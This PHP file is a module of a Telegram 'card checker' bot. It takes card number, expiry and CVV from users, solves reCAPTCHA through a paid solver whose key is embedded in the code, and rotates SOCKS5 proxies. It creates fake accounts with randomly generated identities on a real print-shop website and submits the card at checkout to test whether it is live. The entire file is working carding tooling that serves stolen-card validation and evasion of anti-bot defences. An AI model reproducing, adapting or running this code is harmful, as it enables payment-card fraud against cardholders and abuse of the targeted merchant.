<?php
if(strpos($message, '!ps') === 0 or strpos($message, '/ps') === 0 or strpos($message, '.ps') === 0){
    sendaction($chatId, typing);
        $NameGater ='Poseidón';
$gateway = '/ps :'.$NameGater;
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Payflow Auth</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!ps card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];


$firstDigit = $cc[0];

if ($firstDigit === '4' || $firstDigit === '5' || $firstDigit === '3') {
    echo $firstDigit === '4' ? "La tarjeta es de tipo Visa." : "La tarjeta es de tipo MasterCard.";
} else {
    reply_to($chatId,$message_id,$keyboard,"<b>Tipo de tarjeta no soportado. Solo se aceptan Visa , MasterCard y Amex .</b>");
    die();
}

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Payflow Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

#EMPIEZA EL PROCESO DE CHEQUEO


    


#------[CURL-2]------#
$rotate = rotate();
$socks5 = socks5();


if(strlen($ano) == 4){
  $ano = substr($ano,-2);
}

if(strlen($mes) == 1){
    $mes = "0".$mes;
  }

$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefMNOPQ56789_!'), 0, 12);


$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];



$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];


$curl = new CurlX;




$maxRetries = 3; // número máximo de intentos
$retries = 0; // contador de intentos




while ($retries < $maxRetries) {
    try { 
		$headers = [
		    'Accept: text/html, */*; q=0.01',
		    'Accept-Language: es-ES,es;q=0.9',
		    'Connection: keep-alive',
		    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
		];
		$headers_post = [
		    'Accept: text/html, */*; q=0.01',
		    'Accept-Language: es-ES,es;q=0.9',
		    'Connection: keep-alive',
		    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
		    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
		];
        
        $cookie = uniqid();
        $server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];
                
        $solution = $solver->recaptchaV2(
            \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
            [
                'websiteURL'    => 'https://www.mrprint.com/',
                'websiteKey'    => '6LfDUFEUAAAAAJNNOHdihgt4W_g0EMgImE5moXpO',
            ]);
            $captcha = $solution["gRecaptchaResponse"];

        
        // Registrar cuenta
        $data = 'action=step2&registrationChoice=N&invitation=&customerNo=&invoiceNo=&firstName='.$firstname.'&lastName='.$lastname.'&jobTitle=&phone='.$phone.'&company=Bruh+Co&addressLine1='.$phone.'&addressLine2=&addressLine3=&country=USA&stateList=NY&stateValue=&city=New+York&zipCode=10001&emailAddress='.$email.'&password=bruhbruh123&reenterPassword=bruhbruh123&acceptTerms=A&g-recaptcha-response='.$captcha;
        $req2 = $curl::Post('https://www.mrprint.com/create-an-account-step-2', $data, $headers_post, $cookie, $server, true);
        if (!$req2->success) {
            throw new Exception("Connection error on request #1 " . $retries . ". Please try again.");
        }
        
        // Agregar al carrito
        $req2 = $curl::Get('https://www.mrprint.com/store/cart-action?action=add&cartType=standard&webItemNo=7009336&quantity=1', $headers, $cookie, $server, true);
        if (!$req2->success) {
            throw new Exception("Connection error on request #2 " . $retries . ". Please try again.");
        }

        // Crear shipping
        $data = 'billtoCustomerNo=&shiptoClass=M&myAddressType=open&name=Bruh+Co&address1='.$street.'&address2=&address3=&country=USA&stateList=NY&state=&city=New+York&zipCode=10001&customerNo=&customerName=&customerAddress1=&customerAddress2=&customerAddress3=&customerCountry=&customerStateList=&customerState=&customerCity=&customerZipCode=&fobCd=&attentionFullName='.$firstname.'+'.$lastname.'&attentionPhone='.$phone.'&attentionEmailAddress='.$email;
        $req2 = $curl::Post('https://www.mrprint.com/store/checkout/shipping-address', $data, $headers_post, $cookie, $server, true);
        if (!$req2->success) {
            throw new Exception("Connection error on request #3 " . $retries . ". Please try again.");
        }
        echo $req2->body;

        // Completar shipping
        $data = 'shipCompleteFlag=Y&customerAccountShipviaCd=DHL&customerAccountId=&newShipviaAccountNo='.random_int(100000000,999999999);
        $req2 = $curl::Post('https://www.mrprint.com/store/checkout/shipping-method', $data, $headers_post, $cookie, $server, true);
        if (!$req2->success) {
            throw new Exception("Connection error on request #4 " . $retries . ". Please try again.");
        }
        echo $req2->body;

        $req2 = $curl::Get('https://www.mrprint.com/store/checkout/payment', $headers, $cookie, $server, true);
        if (!$req2->success) {
            throw new Exception("Connection error on request #5 " . $retries . ". Please try again.");
        }
        $paymentEncrypt = ($curl::ParseString($req2->body, 'id="paymentMethodIdEncrypt1" value="','" checked>'));
        echo $paymentEncrypt;

        // Agregar tarjeta
        switch($cc[0]){
            case '4':
                $typecard = 'VISA';
                break;
            case '5':
                $typecard = 'MASTERCARD';
                break;
            default:
                $typecard = 'VISA';
                break;
        }
        $data = 'paymentMethodIdEncrypt=&creditCardType='.$typecard.'&creditCardNumber='.$cc.'&creditCardExpMonth='.ltrim($mes, '0').'&creditCardExpYear='.$ano.'&creditCardCscCode='.$cvv.'&paymentNickname=&cardholderName='.$firstname.'+'.$lastname.'&useAddress=&address1='.$street.'&address2=&address3=&country=USA&stateList=NY&state=&city=New+York&zipCode=10080&phone=&fax=&g-recaptcha-response='.$captcha;
        $req2 = $curl::Post('https://www.mrprint.com/credit-card-maint?action=add', $data, $headers_post, $cookie, $server, true);
        if (!$req2->success) {
            throw new Exception("Connection error on request #6 " . $retries . ". Please try again.");
        }
        $response = ($curl::ParseString($req2->body, '<div class="space-top"></div>
					<ul>
				<li>','</li>'));


        if (str_contains($response, 'Thank you')) {
            echo "Approved (Ship)";
        } else {
            echo "Declined";
        }
        break;
    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
            echo "Intento $retries: " . $e->getMessage() . "\n" ;
            return;
        }
    }
}



$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);


bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Payflow Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

if(strpos($req2->body, "CVV2 Declined")){ 
$status = "Approved ✅";
$response = "CVV2 VALUE MISMATCH";
}elseif (strpos($req2->body, "Not sufficient funds")){ 
$status = "Approved ✅";
$response = "Not sufficient funds";
}elseif (strpos($result2, "three_d_secure_2_source") ||(strpos($result2,'three_d_secure_redirect'))){ 
$status = "Declined! 🔴";
$response = "3D Card.❌";
}elseif (strpos($result2, "Your card does not support this type of purchase")){ 
$status = "Declined! 🔴";
$response = "Your card does not support this type of purchase🟥";
}elseif (strpos($result2, "do_not_honor")){ 
$status = "Declined! 🔴";
$response = "do_not_honor";
}elseif (strpos($result2, "invalid_account")){ 
$status = "Declined! 🔴";
$response = "invalid_account";
}else{
$status = "Declined! 🔴";
$response = "$response";
   }

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Payflow Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html', 
'reply_to_message_id'=> $message_id]);


}

?>

